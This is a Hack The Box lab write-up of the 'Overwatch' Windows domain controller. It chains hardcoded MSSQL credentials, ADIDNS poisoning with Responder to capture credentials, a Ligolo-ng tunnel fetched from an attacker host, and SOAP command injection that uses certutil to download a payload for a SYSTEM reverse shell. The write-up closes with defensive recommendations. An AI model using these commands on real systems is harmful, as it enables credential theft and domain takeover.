---
title: "Overwatch — ADIDNS Poisoning and WCF SOAP Command Injection"
description: "A monitoring binary leaks MSSQL credentials; ADIDNS poisoning captures more, and WCF command injection returns a SYSTEM shell."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - adidns
  - mssql
  - linked-server
  - wcf
  - command-injection
objective: "Chain hardcoded MSSQL credentials, ADIDNS poisoning, and a WCF SOAP injection to SYSTEM-level access"
tools:
  - rustscan
  - NetExec
  - ILSpy
  - impacket-mssqlclient
  - dnstool
  - Responder
  - Ligolo-ng
  - evil-winrm
  - curl
  - netcat
skill: "ADIDNS poisoning, linked-server credential capture, and SOAP command injection"
outcome: "SYSTEM-level command execution on the domain controller"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Medium |
| Target environment | Windows Server 2022 domain controller (Active Directory) |
| Starting position | Unauthenticated network access |
| Objective | Chain hardcoded MSSQL credentials, ADIDNS poisoning, and a WCF SOAP injection to SYSTEM-level access |
| Outcome | SYSTEM-level command execution on the domain controller |

## ADIDNS poisoning to WCF injection

Overwatch is a Medium-rated Hack The Box Windows Active Directory lab. A guest-readable `software$` SMB share exposes a .NET monitoring executable whose decompiled source contains hardcoded MSSQL credentials. The database holds a linked server entry with no DNS record; registering a spoofed ADIDNS A record redirects the name to an attacker host, and triggering the linked server query makes the database transmit credentials that Responder captures in cleartext. Those credentials authenticate over WinRM, and an internal-only WCF service reachable through a Ligolo-ng tunnel exposes a `KillProcess` operation whose unsanitised `processName` parameter yields command execution as `NT AUTHORITY\SYSTEM`. This writeup replaces target identifiers, credentials, and secret values with role-based placeholders and leaves command syntax intact. See [how evidence is handled](/method/). Where the working session retained no console excerpt, I could not verify the result against captured output, so it is stated as recorded.

**Attack path:** **Guest-readable `software$` share → hardcoded MSSQL credentials → ADIDNS-poisoned linked server → cleartext credential capture → WinRM access → Ligolo-ng tunnel → WCF SOAP `KillProcess` injection → SYSTEM**

## Server 2022 controller with MSSQL and a guest share

- **Target:** Windows Server 2022 domain controller on `<TARGET_DOMAIN>`, exposing DNS (53), Kerberos (88), LDAP (389/3268), RDP (3389), SMB (445), MSSQL on non-standard port 6520, and .NET Message Framing (9389).
- **Starting position:** unauthenticated network access; no credentials provided.
- **Objective:** enumerate the exposed services, obtain an initial foothold, pivot to the internal WCF service, and escalate to SYSTEM.
- **Constraints:** all activity stayed inside the Hack The Box lab environment.

## Evidence: guest share to ADIDNS to SOAP injection

### 1. Service Enumeration

Observation: a full TCP scan exposes the domain-controller services, including MSSQL on 6520 rather than the default 1433.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN <OUT_FILE>
```

Truncated output:

```text
389/tcp   open  ldap           Microsoft Windows AD LDAP (Domain: <TARGET_DOMAIN>)
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server  Microsoft Terminal Services
|   DNS_Domain_Name:      <TARGET_DOMAIN>
|   DNS_Computer_Name:    <TARGET_HOSTNAME>
|   Product_Version:      10.0.20348
6520/tcp  open  ms-sql-s       Microsoft SQL Server 2022 16.00.1000
9389/tcp  open  mc-nmf         .NET Message Framing
```

Significance: the RDP banner identifies Server build 10.0.20348 (Windows Server 2022); the LDAP domain distinguishes a domain controller; MSSQL on a non-default port is the eventual credential-recovery surface, and the `.NET Message Framing` service indicates AD Web Services.

Result: an Active Directory domain controller is exposed with MSSQL on port 6520.

### 2. SMB Enumeration: Guest-Readable Share

Observation: SMB permits an unauthenticated session, and a non-standard `software$` share is readable.

```bash
nxc smb <TARGET_IP> -u 'a' -p '' --shares
nxc smb <TARGET_IP> -u 'a' -p '' -M spider_plus -o DOWNLOAD_FLAG=True
```

Truncated output:

```text
SMB  <TARGET_IP>  445  <TARGET_HOSTNAME>  software$  READ
```

Significance: a read-only non-standard share on a domain controller is unusual and warrants review; spidering it retrieves a `monitor` directory containing `overwatch.exe` and `overwatch.exe.config`.

Result: a guest-readable share holding monitoring binaries and configuration is identified and retrieved.

### 3. Static Analysis: Hardcoded Credentials

Observation: decompiling `overwatch.exe` with ILSpy exposes a hardcoded SQL connection string.

```csharp
SqlConnection val = new SqlConnection(
    "Server=localhost;Database=<APPLICATION_DATABASE>;User Id=<SQL_SERVICE_ACCOUNT>;Password=<SQL_SVC_PASSWORD>"
);
```

Significance: any .NET decompiler can recover credentials embedded in a distributed binary, and because the share is guest-readable, anonymous SMB access immediately yields database credentials.

Result: MSSQL service account credentials are recovered from the binary.

### 4. Static Analysis: WCF Service Configuration

Observation: `overwatch.exe.config` declares an internal WCF service on port 8000.

```xml
<service name="MonitoringService">
  <host>
    <baseAddresses>
      <add baseAddress="http://<TARGET_DOMAIN>:8000/MonitorService" />
    </baseAddresses>
  </host>
</service>
```

Significance: port 8000 did not appear in the external scan, so the endpoint is bound internally and will require a pivot before it can be reached.

Result: an internal-only WCF endpoint is identified on port 8000.

### 5. MSSQL Access: Linked Server Discovery

Observation: the recovered service account authenticates to MSSQL, and enumerating linked servers reveals `<LINKED_SERVER_NAME>`, a name that does not resolve in DNS.

```bash
impacket-mssqlclient <TARGET_DOMAIN>/<SQL_SERVICE_ACCOUNT>:'<SQL_SVC_PASSWORD>'@<TARGET_IP> \
  -port 6520 -windows-auth
```

```sql
SELECT name, provider, data_source FROM sys.servers WHERE is_linked = 1;
```

```text
<LINKED_SERVER_NAME>  SQLNCLI  SQL Server  <LINKED_SERVER_NAME>
```

A query against the linked server fails:

```sql
SELECT * FROM [<LINKED_SERVER_NAME>].master.sys.databases;
```

```text
Login timeout expired
A network-related or instance-specific error has occurred while establishing a
connection to SQL Server. Server is not found or not accessible.
```

Significance: an unresolvable linked server name is a poisoning opportunity: if the name resolves to an attacker host when the query is triggered, the database will attempt to authenticate there.

Result: a linked server entry is present and its name has no DNS record.

### 6. ADIDNS Poisoning: Credential Capture

Observation: AD-integrated DNS stores records as AD objects, and by default a domain-authenticated user can create new records. The recovered service account is such a user, so it can register a spoofed A record for `<LINKED_SERVER_NAME>`.

```bash
python3 dnstool.py -u '<TARGET_DOMAIN>\<SQL_SERVICE_ACCOUNT>' -p '<SQL_SVC_PASSWORD>' \
  -r '<LINKED_SERVER_NAME>' -a add -d '<ATTACKER_IP>' <TARGET_IP>
```

With a listener running, the linked server query is triggered again:

```bash
sudo responder -I tun0
```

```sql
EXEC ('SELECT name FROM sys.databases') AT [<LINKED_SERVER_NAME>];
```

```text
[MSSQL] Cleartext Client   : <TARGET_IP>
[MSSQL] Cleartext Hostname : <LINKED_SERVER_NAME> ()
[MSSQL] Cleartext Username : <SQL_MANAGEMENT_ACCOUNT>
[MSSQL] Cleartext Password : <SQL_MGMT_PASSWORD>
```

Significance: linked-server connections that use the SQLNCLI provider with SQL Server authentication transmit the login over TDS; against a non-SQL endpoint the authentication phase arrives in a form Responder parses as cleartext, distinct from Windows authentication, which would produce an NTLMv2 hash.

Result: cleartext credentials for a second MSSQL account are captured.

### 7. WinRM Access: Initial Foothold

Observation: the captured account authenticates over WinRM.

```bash
evil-winrm -i <TARGET_IP> -u '<SQL_MANAGEMENT_ACCOUNT>' -p '<SQL_MGMT_PASSWORD>'
```

Significance: WinRM provides an interactive PowerShell session, so a captured credential becomes host-level command execution.

Result: an authenticated user-level shell is obtained on the target.

### 8. Internal Service Discovery: WCF on Port 8000

Observation: Using `netstat`, I checked the listening ports and found port 8000 listening internally, owned by process ID 4.

```powershell
netstat -ano | findstr LISTEN
```

```text
TCP    0.0.0.0:8000    0.0.0.0:0    LISTENING    4
```

Significance: PID 4 is the System process, so the service runs as `NT AUTHORITY\SYSTEM`; a SYSTEM-owned service reachable only inside the host is a high-value target for command injection.

Result: the WCF service listens internally and runs as SYSTEM.

### 9. Port Forwarding via Ligolo-ng

Observation: the WCF service listens on `0.0.0.0:8000`, but port 8000 had no external exposure, so a Ligolo-ng tunnel is used to reach it from the attack machine.

```bash
sudo ./proxy -selfcert
```

```powershell
iwr -OutFile C:\Windows\Temp\agent.exe http://<ATTACKER_IP>/agent.exe
.\agent.exe -connect <ATTACKER_IP>:11601 -v -accept-fingerprint <FINGERPRINT>
```

```bash
sudo ip route add <PIVOT_IP>/32 dev ligolo
```

Significance: Ligolo-ng maps traffic to `<PIVOT_IP>` through the target's network stack, making the internal-only endpoint reachable at `http://<PIVOT_IP>:8000/MonitorService`.

Result: the internal WCF service becomes reachable from the attack machine.

### 10. WCF SOAP Service Analysis

Observation: fetching the WSDL describes an `IMonitoringService` interface whose `KillProcess` operation takes a single `processName` string.

```bash
curl -s http://<PIVOT_IP>:8000/MonitorService?wsdl
```

```xml
<xs:element name="KillProcess">
  <xs:complexType>
    <xs:sequence>
      <xs:element minOccurs="0" name="processName" nillable="true" type="xs:string"/>
    </xs:sequence>
  </xs:complexType>
</xs:element>
```

Significance: a SYSTEM-level service that accepts an unsanitised string and uses it in a process-killing routine is an injection candidate if the value reaches `cmd.exe` or PowerShell without validation.

Result: an injectable string parameter is identified in the WSDL.

### 11. Command Injection: Proof of Concept

Observation: a semicolon-delimited command placed in `processName` executes in the service's SYSTEM context.

```xml
<tem:processName>notepad.exe ; type nul > C:\Users\<SQL_MANAGEMENT_ACCOUNT>\Documents\test_rce</tem:processName>
```

```bash
curl -s -X POST http://<PIVOT_IP>:8000/MonitorService \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: http://tempuri.org/IMonitoringService/KillProcess" \
  --data @poc.xml
```

Significance: the `processName` value is passed to an OS shell without validation, so injected shell metacharacters are interpreted.

Result: the created marker file confirms command injection in the SYSTEM context.

### 12. SYSTEM Shell via SOAP Command Injection

Observation: the confirmed injection point can fetch and execute a payload in the SYSTEM context.

```xml
<tem:processName>notepad.exe ; certutil -urlcache -split -f <REMOTE_BINARY> C:\Users\<SQL_MANAGEMENT_ACCOUNT>\Documents\shell.ps1</tem:processName>
```

```xml
<tem:processName>notepad.exe ; C:\Users\<SQL_MANAGEMENT_ACCOUNT>\Documents\shell.ps1</tem:processName>
```

```bash
nc -lvnp 9001
```

```text
PS C:\Software\Monitoring> whoami
nt authority\system
```

Significance: the chain from a guest-readable share to SYSTEM required no CVE; every step relied on a configuration weakness or missing input validation.

Result: a SYSTEM-level shell is obtained on the domain controller.

## Unreachable WCF and a missing DNS record

| Challenge | Decision | Rationale |
|---|---|---|
| The internal WCF service on port 8000 was not reachable from the attack machine | Reached the internal-only service through a Ligolo-ng transparent tunnel | The endpoint was not reachable externally |
| The linked server query timed out because `<LINKED_SERVER_NAME>` had no DNS record | Registered a spoofed ADIDNS A record pointing the name at the attack host | Forces the database to authenticate to an attacker-controlled endpoint |

## Outcome: SYSTEM command execution without a CVE

The path reaches SYSTEM-level command execution on the domain controller and, with it, effective domain compromise, without exploiting a single CVE. LDAP, Kerberos, and RDP were exposed but not used in the path; every step rested on misconfiguration or missing input validation.

## Recommendations: hardcoded secrets, ADIDNS writes, linked servers, and SOAP input

These actions are recommendations. No validation is documented.

1. **Hardcoded credentials in a distributed binary.** `overwatch.exe` embedded a SQL connection string and sat in a guest-readable share, so anonymous access immediately yielded database credentials. *Recommendation:* keep secrets out of compiled artifacts. Use protected configuration stores, DPAPI-protected files, or managed service accounts, and require authentication on shares holding application software. *Detection:* scan build artifacts and shares for embedded secrets.
2. **Default ADIDNS write permissions.** Any authenticated account could register the spoofed record that redirected the linked server. *Recommendation:* restrict DNS record creation with DNS-specific ACLs and review which principals can create records in AD-integrated zones. *Detection:* monitor for unexpected A-record creation, especially names matching configured linked servers.
3. **Linked servers using SQL authentication.** The SQLNCLI linked-server connection transmitted credentials that Responder parsed as cleartext against a non-SQL endpoint. *Recommendation:* use Windows (Kerberos) authentication for linked servers, and restrict who may create them. *Detection:* monitor SQL authentication to unexpected hosts from database servers.
4. **Unsanitised input in a SYSTEM-level service.** The `KillProcess` operation passed `processName` to an OS shell, which yielded SYSTEM command execution. *Recommendation:* validate the parameter against a whitelist, never pass external input to a shell, and run the service under a least-privilege account instead of SYSTEM. *Detection:* monitor the service for process names containing shell metacharacters.

## References

- [Hack The Box — Overwatch](https://app.hackthebox.com/machines/Overwatch) (retired machine)
- [RustScan](https://github.com/RustScan/RustScan) (fast port scanner)
- [NetExec (nxc)](https://github.com/Pennyw0rth/NetExec) (SMB enumeration and share spidering)
- [ILSpy](https://github.com/icsharpcode/ILSpy) (.NET decompiler)
- [Impacket — `mssqlclient`](https://github.com/fortra/impacket) (MSSQL client)
- [krbrelayx — `dnstool.py`](https://github.com/dirkjanm/krbrelayx) (ADIDNS record manipulation)
- [Responder](https://github.com/lgandx/Responder) (rogue authentication server)
- [Ligolo-ng](https://github.com/nicocha30/ligolo-ng) (transparent network tunnel)
- [evil-winrm](https://github.com/Hackplayers/evil-winrm) (WinRM shell)
- [Microsoft — Dynamic DNS Update in Windows and Windows Server](https://learn.microsoft.com/en-us/windows-server/networking/dns/dynamic-update) (AD-integrated zone dynamic-update behavior)
- [Microsoft — Linked Servers (Database Engine)](https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-servers-database-engine)
- [Microsoft — Create Linked Servers (SQL Server Database Engine)](https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine)
- [What is Windows Communication Foundation (Microsoft Learn)](https://learn.microsoft.com/en-us/dotnet/framework/wcf/whats-wcf)
